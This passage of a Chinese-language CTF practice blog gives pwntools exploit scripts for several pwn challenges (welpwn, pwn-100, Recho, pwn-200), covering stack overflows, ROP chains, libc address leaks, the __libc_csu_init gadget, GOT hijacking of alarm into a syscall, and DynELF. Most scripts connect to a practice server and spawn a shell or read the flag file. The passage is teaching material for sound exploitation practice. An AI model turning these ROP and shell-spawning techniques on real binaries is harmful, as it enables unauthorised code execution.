<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#泄露write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br></code></pre></td></tr></table></figure>
<p>得到write的地址为0x7f0e5b3c72b0，用后三位2b0查找libc的版本可以知道是2.23</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214825951.png" alt="image-20210413214825951"></p>
<p>最后构建payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>* <br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41584&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./welpwn&#x27;</span>)  <br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_4=<span class="hljs-number">0x40089c</span><br>pop_rdi=<span class="hljs-number">0x4008a3</span><br>main_addr = <span class="hljs-number">0x4007CD</span><br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_4)+p64(pop_rdi)+p64(write_got)+p64(puts_plt)+p64(main_addr) <br><span class="hljs-comment">#构建put函数的rop链，泄露write函数的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;Welcome to RCTF\n&quot;</span>,payload1)<br><br>p.recvuntil(<span class="hljs-string">&#x27;\x40&#x27;</span>)  <br><span class="hljs-comment">#获取write地址  </span><br>write_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%#x&#x27;</span>%write_addr)<br><br>libc=ELF(<span class="hljs-string">&quot;libc6_2.23.so&quot;</span>)<br>libc_write=libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]   <br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_binsh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#获取libc的基地址，用得到的write地址减去libc里write的地址</span><br>libc_base = write_addr - libc_write<br><span class="hljs-comment">#获取system地址  </span><br>system_addr = libc_base + libc_system  <br><span class="hljs-comment">#获取/bin/sh地址  </span><br>binsh_addr = libc_base + libc_binsh  <br><br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)  <br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)<br><span class="hljs-comment">#构建rop链，执行system（/bin/sh）</span><br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn100-3个参数的万能rop链"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn100-3个参数的万能rop链"></a> 攻防世界-pwn-pwn100-3个参数的万能rop链</h1>
<p>1.首先检查程序，只开启了nx保护</p>
<p>​                     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214930924.png" alt></p>
<p>2.使用ida进行分析</p>
<p>主函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413214955997.png" alt="image-20210413214955997" style="zoom:67%;">
<p>Sub_40068E()</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215015084.png" alt="image-20210413215015084" style="zoom:67%;">
<p>Sub_40063D()</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215033863.png" style="zoom:67%;">
<p>可以看出这是一个for循环，每次都向v1的位置读取输入1个字节，i不能超过200</p>
<p>这里查看v1的栈空间只有0x40，可以进行栈溢出</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215105959.png" alt="image-20210413215105959" style="zoom:67%;">
<p>再查看函数，存在puts和read，可以进行泄露，由于没有/bin/sh，所以我们得寻找一个数据段进行写入，用gdb查看内存段权限，发现0x00600e10到   0x00601068是可以进行读写的。</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215131810.png" alt="image-20210413215131810" style="zoom:67%;">
<p>然后继续用ida查看此内存段，发现0x00600e10到0x601068处可以进行写入，用ida查看此处，发现在0x601040处有数据段可以使用此地址写入/bin/sh</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215149078.png" alt="image-20210413215149078" style="zoom:67%;">
<p>我们可以使用程序中的read函数进行写入，read函数有3个参数，这时我们需要一个万能的Gadget进行传参，教程如https://xz.aliyun.com/t/5597，如下图，此程序中也存在__libc_csu_init()这样的函数</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215216727.png" alt="image-20210413215216727" style="zoom:67%;">
<p>如图，先从 0x40075A 开始执行，将 rbx/rbp/r12/r13/r14/r15 这六个寄存器全部布置好，再 ret 到 0x400740 ，继续布置 rdx/rsi/rdi，最后通过 call qword ptr[r12+rbx*8] 执行目标函数。</p>
<p>这个通用 Gadget 好用的地方在于，不仅可以通过函数地址的指针（通常会用记录库函数真实地址的 got 表项）来控制目标函数，还可以控制目标函数的最多三个入参（rdi/rsi/rdx）的值。此外，只要设置 rbp=rbx+1而且栈空间足够，这个 Gadget 可以一直循环调用下去。栈的结构类似下图（原网页的图，第一个0x40061A对应该程序的0x40075A，0x400600对应该程序的0x400740.）</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215235442.png" alt="image-20210413215235442" style="zoom:67%;">
<p>所以这里可以使用这个gadget构建read函数向.bss段写入/bin/sh</p>
<p>由于是64位程序，还要找到一个pop rdi的地址是0x400763</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413215305789.png" alt="image-20210413215305789" style="zoom:67%;">
<p>Payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;./pwn-100&#x27;)</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwn-100&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;37423&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&quot;libc-2.23.so&quot;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>read_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>read_plt = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x400763</span><br>pop_6 = <span class="hljs-number">0x040075A</span><br>mov_3 = <span class="hljs-number">0x0400740</span><br>start = <span class="hljs-number">0x0400550</span><br><br><span class="hljs-comment">#构造rop链，泄露puts函数真实地址</span><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)<br>payload1 = payload1.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\x0a&#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) <span class="hljs-comment">#把接收末尾的\0a替换为\00</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(puts_addr)<br><br><span class="hljs-comment">#用偏移量计算程序中的地址</span><br>libc_puts=libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>libc_base = puts_addr - libc_puts<br>system_addr = libc_base + libc_system<br><br><span class="hljs-comment">#用read函数向0x601040写入</span><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_6) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(read_got) + p64(<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0x601040</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#Gadget 需要布置六个寄存器（rbx/rbp/r12/r13/r14/r15）加一个 ret 返回地址，x64 下至少需要 56 个字节的栈空间</span><br><span class="hljs-comment">#所以mov_3之后的需要56个字节才能到返回到start</span><br>payload2 += p64(mov_3) + <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(start) <br>payload2 = payload2.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload2)<br>p.recvuntil(<span class="hljs-string">&#x27;bye~\n&#x27;</span>)<br><span class="hljs-comment">#写入/bin/sh</span><br>p.send(<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><br><span class="hljs-comment">#构造rop链进行getshell</span><br>payload3 = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + p64(pop_rdi) + p64(<span class="hljs-number">0x601040</span>) + p64(system_addr) <br>payload3 = payload3.ljust(<span class="hljs-number">200</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>p.send(payload3)<br>p.interactive()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-recho-构造系统调用劫持got表"><a class="markdownIt-Anchor" href="#攻防世界-pwn-recho-构造系统调用劫持got表"></a> 攻防世界-pwn-Recho-构造系统调用劫持got表</h1>
<p>1.首先看一下程序的保护机制，只开启了NX保护</p>
<img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220457874.png" alt="image-20210413220457874" style="zoom:67%;">              
<p>2.然后使用ida分析 ，主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220516158.png" alt="image-20210413220516158" style="zoom:67%;">
<p>可以看出，程序会先读取我们输入的数字，然后我们输入这个长度的字符串，然后程序会进行输出，然后我们注意到字符串里有一个flag，可能之后会用到</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220534899.png" alt="image-20210413220534899" style="zoom:67%;">
<p>首先我们要考虑的是结束主函数的循环，pwntools里有一个shutdown的功能，可以用这个功能结束循环，但是就不能重新rop到主函数进行获取输入了，我们必须一次性完成所有操作。</p>
<p>由于要一次性完成操作，所以不能用之前的泄露地址的方法，这里因为数据段中存在flag，像open，write，read，alarm之类函数都存在系统调用（syscall）所以我们可以利用这个，可以直接抓取flag然后打印出来</p>
<p>故我们需要构造一个这样的代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>,READONLY); <br><span class="hljs-built_in">read</span>(fd,buf,<span class="hljs-number">100</span>); <br><span class="hljs-built_in">printf</span>(buf); <br></code></pre></td></tr></table></figure>
<p>用gdb动态调试时对alarm进行分析</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220620011.png" alt="image-20210413220620011" style="zoom:67%;">
<p>偏移为5的位置存在syscall,所以我们要进行劫持got表，首先我们得用</p>
<p>ROPgadget找到几个需要用到的构造代码</p>
<p>1.pop_rdi_ret=0x4008a3</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220641797.png" alt="image-20210413220641797" style="zoom:67%;">
<p>2.pop_rax_ret=0x4006fc</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220701351.png" alt="image-20210413220701351" style="zoom:67%;">
<p>3.add_rdi_ret = 0x40070d</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413220732971.png" alt="image-20210413220732971"></p>
<p>所以劫持alarm的got表的构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># alarm() ---&gt; syscall</span><br><span class="hljs-comment"># alarm_got = alarm_got + 0x5</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rdi = alarm_got</span><br>payload += p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br></code></pre></td></tr></table></figure>
<p>第二步：构造fd = open(“flag”,READONLY)，由于open的系统调用号为2，所以把rax设置为2后调用syscall即可调用open()，ida中flag的地址为0x601058</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220815449.png" alt="image-20210413220815449" style="zoom:67%;">
<p>还需要一个pop_rsi_ret = 0x4008a1</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220835212.png" alt="image-20210413220835212"></p>
<p>所以构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br></code></pre></td></tr></table></figure>
<p>第三步：构造read(fd,buf,100)，可以直接把flag文件打开，并且存放到一个可以读写的位置，因为.bss段是可以读写的，所以我们需要一个地址存储读出来的flag，这里我们选择buf=0x601068</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220907110.png" alt="image-20210413220907110" style="zoom:67%;">
<p>还需要一个pop_rdx_ret = 0x4006fe</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413220925801.png" alt="image-20210413220925801" style="zoom:67%;">
<p>所以构造如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br>第四步：构造printf(buf)<br><span class="hljs-comment">#print flag</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br>根据以上描述，构造payload如下<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./Recho&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;41714&#x27;</span>)<br>pop_rdi_ret = <span class="hljs-number">0x4008a3</span><br>pop_rax_ret = <span class="hljs-number">0x4006fc</span><br>add_rdi_ret = <span class="hljs-number">0x40070d</span><br>pop_rsi_ret = <span class="hljs-number">0x4008a1</span><br>pop_rdx_ret = <span class="hljs-number">0x4006fe</span><br>alarm_plt=elf.plt[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>printf_plt=elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>alarm_got=elf.got[<span class="hljs-string">&#x27;alarm&#x27;</span>]<br>flag = <span class="hljs-number">0x601058</span><br>buf = <span class="hljs-number">0x601068</span><br><br><span class="hljs-comment"># 劫持alarm的got表</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><span class="hljs-comment"># rax = 0x5</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">0x5</span>)<br><span class="hljs-comment"># rdi = alarm_got</span><br>payload+= p64(pop_rdi_ret) + p64(alarm_got)<br><span class="hljs-comment"># [rdi] = [rdi] + 0x5 </span><br>payload += p64(add_rdi_ret)<br><br><span class="hljs-comment"># 构造 fd = open(&quot;flag&quot; , 0)</span><br><span class="hljs-comment"># rax = 2</span><br>payload += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># rdi = &amp;&quot;flag&quot;</span><br>payload += p64(pop_rdi_ret) + p64(flag)<br>payload+=p64(pop_rdx_ret)+p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rsi = 0 (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># open(&quot;flag&quot; , 0)</span><br>payload += p64(alarm_plt)<br><br><span class="hljs-comment"># 构造 read(fd, buf, 100)</span><br><span class="hljs-comment"># rdi = 3 打开一个文件</span><br>payload += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>)<br><span class="hljs-comment"># rsi = buf (r15 = 0)</span><br>payload += p64(pop_rsi_ret) + p64(buf) + p64(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># rdx = 100</span><br>payload += p64(pop_rdx_ret) + p64(<span class="hljs-number">100</span>)<br><span class="hljs-comment"># read(3, buf, 100)</span><br>payload += p64(read_plt)<br><br><span class="hljs-comment">#构造 printf(buf)</span><br><span class="hljs-comment"># rdi = buf</span><br>payload += p64(pop_rdi_ret) + p64(buf)<br><span class="hljs-comment"># printf(buf)</span><br>payload += p64(printf_plt)<br><br>p.recvuntil(<span class="hljs-string">&#x27;Welcome to Recho server!\n&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x200</span>))<br>payload=payload.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.send(payload)<br>p.recv()<br>p.shutdown(<span class="hljs-string">&#x27;send&#x27;</span>)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-pwn-200-dynelf模块使用"><a class="markdownIt-Anchor" href="#攻防世界-pwn-pwn-200-dynelf模块使用"></a> 攻防世界-pwn-pwn-200-DynELF模块使用</h1>
<p>1.先检查程序保护，32位程序，发现只开启了NX保护</p>
<p>​          <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221127258.png" alt="image-20210413221127258" style="zoom:67%;"></p>
<p>2.使用ida查看函数，主函数如下</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221142918.png" alt="image-20210413221142918" style="zoom:67%;">
<p>发现在sub_8048484()函数下存在栈溢出漏洞</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221159623.png" alt="image-20210413221159623" style="zoom:67%;">
<p>该题无libc，我们可以使用pwntool的DynELF模块</p>
<p>此题目借助DynElF模块实现有一下要点</p>
<p>本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下借助DynELF实现利用的要点：</p>
<p>1）调用write函数来泄露地址信息，比较方便；</p>
<p>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；</p>
<p>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；</p>
<p>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
<h3 id="dynelf模块介绍"><a class="markdownIt-Anchor" href="#dynelf模块介绍"></a> DynELF模块介绍</h3>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">p = process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br><br> <span class="hljs-comment">#各种预处理</span><br><br> payload = <span class="hljs-string">&quot;xxxxxxxx&quot;</span> + address + <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br><br> p.send(payload)<br><br> <span class="hljs-comment">#各种处理</span><br><br> data = p.recv(<span class="hljs-number">4</span>)<br><br> log.debug(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (address, (data **<span class="hljs-keyword">or</span>** <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br><br> <span class="hljs-keyword">return</span> data<br><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">&quot;./xxx&quot;</span>))   <span class="hljs-comment">#初始化DynELF模块</span><br><br>systemAddress = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>) <span class="hljs-comment">#在libc文件中搜索system函数的地址</span><br></code></pre></td></tr></table></figure>
<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。</p>
<p>借助write函数，可以实现泄露</p>
<p>所以我们的leak函数可以这么写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    r.send(payload)<br>    data=r.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> r.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br></code></pre></td></tr></table></figure>
<p>我们还需要找到一个连续3次pop的地址，这里找到的是0x0804856c</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221514111.png" alt="image-20210413221514111" style="zoom:67%;">
<p>然后我们需要一个bss段写入，这里可以用0x0804A020</p>
 <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413221605895.png" alt="image-20210413221605895" style="zoom:67%;">
<p>准备了这些条件后，我们就可以构建payload脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=remote(<span class="hljs-string">&quot;220.249.52.134&quot;</span>,<span class="hljs-number">36377</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn200&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>start_addr=<span class="hljs-number">0x080483d0</span><br>vulnaddress=<span class="hljs-number">0x08048484</span><br>elf=ELF(<span class="hljs-string">&quot;./pwn-200&quot;</span>)<br>write_plt=elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>read_plt=elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>bss_addr = <span class="hljs-number">0x0804a020</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span>(<span class="hljs-params">address</span>):</span><br>    payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x6c</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(vulnaddress)+p32(<span class="hljs-number">1</span>)+p32(address)+p32(<span class="hljs-number">4</span>)<br>    p.send(payload)<br>    data=p.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-built_in">print</span>(data)<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-built_in">print</span> p.recv()<br><br>dyn = DynELF(leak,elf=ELF(<span class="hljs-string">&#x27;./pwn-200&#x27;</span>))<br>sys_addr = dyn.lookup(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&#x27;libc&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system address:&quot;</span>,<span class="hljs-built_in">hex</span>(sys_addr))<br><br><span class="hljs-comment">#调用_start函数，恢复栈</span><br>payload1 = <span 